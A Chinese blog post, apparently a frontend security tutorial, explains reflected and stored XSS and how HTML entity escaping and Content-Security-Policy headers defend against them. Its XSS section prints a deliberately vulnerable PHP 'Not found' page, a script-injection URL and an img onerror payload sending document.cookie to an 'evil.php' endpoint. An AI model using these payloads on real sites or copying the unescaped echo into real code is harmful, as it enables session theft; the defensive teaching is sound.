---
path: '/csp-n-xss'
date: '2020-02-13T11:45:59.470Z'
title: '前端网络安全必修 2 XSS 和 CSP'
tags: ['coding', '网络安全']
---

本文主要涉及内容为：

- 跨站脚本攻击（Cross-site scripting，简称 XSS）
- 内容安全策略（Content-Security-Policy，简称 CSP）

因为 CSP 诞生的主要目的就是防御 XSS 攻击，就把 XSS 放在前面讲吧~

## XSS

```html
<html>
  <body>
    <? php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>
  </body>
</html>
```

这是一个找不到页面时的通用提示代码，同时，也是一个极容易被 XSS 攻击的例子，它很老实地把用户发送的东西都直接塞到 html 里。

当然，你在访问 `http://testsite.test/file_which_not_exist` 的时候它会很正常地表现为：

```
Not found: /file_which_not_exist
```

但是如果想做点坏事，访问 `http://testsite.test/<script>alert("我要做坏事");</script>`，结果会是：

```
Not found: /
```

虽然看起来后面什么都没有，但是如果什么防范措施都没有的话，**js 脚本已经顺利运行了**。

一般这种攻击能做的坏事是盗取用户 cookie，例如插入这样一段代码：

```html
<img
  src="xx"
  onerror="post('../evil.php?cakemonster=' + escape(document.cookie))"
/>
```

上面这种**利用错误信息和搜索结果的反射**进行的 XSS，称为**反射型 XSS**。

还有另一种 XSS 是**储存型 XSS**。

储存型也比较容易理解，**攻击者把恶意脚本提交到被害服务器**，并成功储存，所有人访问特定页面都会遭到攻击。

举个例，要放到富文本编辑器的内容如果不小心处理就很容易被储存型 XSS 攻击。

你可以在[这里](https://jsxss.com/zh/try.html)对比一下 XSS 过滤前后的区别。

另外还有恶名昭彰的 SQL 注入，原理也是差不多。

## html 安全注入

html 会不安全，是因为 `<` 和 `>` 等符号在 html 里都是有内涵的符号，如果像上面一样直接把 `<>` 插到 html 中，处理器自然会认为那是一个标签，而不是小于号和大于号。

对 html 字符串来说，真正的小于号是 `&lt;`，大于是 `&gt;`，意思就是 less than 和 greater than，类似的还有空格 `&nbsp;`。

上面提到的**转义字符**分为 `&` + 实体名称 + `;` 三个部分，你也可以使用**实体编号**而不是**实体名称**。例如 `#60` 是 `lt` 的实体编号，`&lt;` 和 `&#60;` 渲染出来就是同一个东西。

那么实体编号怎么查呢？建议直接用 `charCodeAt()`：

```javascript
'网'.charCodeAt() // => 32593
```

`&#32593;` 就等于“网”字，如果你愿意，甚至可以全都使用实体编号来代替文字 😂

以上是当你使用 php 等处理得到的 html 或是使用 JavaScript 的 **innerHTML** 赋值等 dom 操作时需要注意的内容（react 用户可能知道，react 已经用属性名 `dangerouslySetInnerHTML` 很明确告诉你这个操作很危险）。如果你是使用 `innerText` 插入的话你插入的是普通字符串而不是作为 html 插入，所以放心使用 `<>` 吧，他们就是小于和大于的意思 😀

## CSP

CSP 就是一个**白名单机制**，只允许你的网页里读取指定域名的资源，可用于防止 XSS 攻击。

使用 CSP 的第一种方法是在 HTTP 头定义 Content-Security-Policy：

```
Content-Security-Policy: default-src https://cdn.example.net https://cdn.example2.net; object-src 'none'
```

CSP 的值中，不同属性以 `;` 隔开，同一属性的多个值以空格隔开。上面例子的意思就是默认允许读取 https://cdn.example.net 和 https://cdn.example2.net 的资源，object-src 使用的相关资源无白名单，也就是完全不允许读出。

如果使用了不符合要求的资源，**浏览器**会给予拦截，给出下面的提示：

```
Refused to execute inline script because it violates the following Content Security Policy directive
```

你也可以使用 meta 标签代替 HTTP 头：

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src https://cdn.example.net; child-src 'none'; object-src 'none'"
/>
```

Content-Security-Policy 的常用选项有这些：

- **default-src** 是 src 选项的默认值，但不能覆盖以下值：base-uri、form-action、frame-ancestors、plugin-types、report-uri、sandbox
- **base-uri** 特别说一下 `<base>` 标签是因为孤陋寡闻的我第一次见到。 指定用于一个文档中包含的所有相对 URL 的根 URL，一个文件只能有一个 `<base>` 标签，用起来大概是这样的：`<base target="_top" href="http://www.example.com/">`。
- **connect-src** XHR、WebSockets 等连接使用的地址
- **font-src** 字体文件来源
- **img-src** 图片地址
- **media-src** 音视频地址
- **object-src** Flash 相关
- **report-uri** 出现报错时提交到指定 uri，不能在 `<meta>` 标签使用
- **style-src** 样式文件

在资源列表中除了指定域名，你还可以使用下面四个关键词，注意**一定要加单引号**：

- **'none'** 不进行匹配
- **'self'** 当前域名，不包含子域名
- **'unsafe-inline'** 允许行内 JavaScript 与 CSS
- **'unsafe-eval'** 允许类 eval 操作

当 CSP 正确设置，XSS 插入的行内代码或外部 js 文件就会被拦截。当然这是最后一道防线了，前面提到的关键字过滤也是对付 XSS 的好方法。

要说的基本就这么多，希望大家以后在使用 php、jsp 等后端语言构造 html 文档时要认真思考有没有 XSS 漏洞；另外，在前后端分离发展蓬勃的今天，XSS 可能出现在富文本编辑器中，也同时需要多加注意。

## 拓展阅读

[CSP Cheat Sheet](https://scotthelme.co.uk/csp-cheat-sheet/)

[meta 标签 mdn 文档](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta)

[base 标签 mdn 文档](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/base)

## 参考

**重点推荐** [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)

[CROSS-SITE SCRIPTING (XSS) TUTORIAL](https://www.veracode.com/security/XSS)

[html 转义字符串](http://caibaojian.com/576.html)
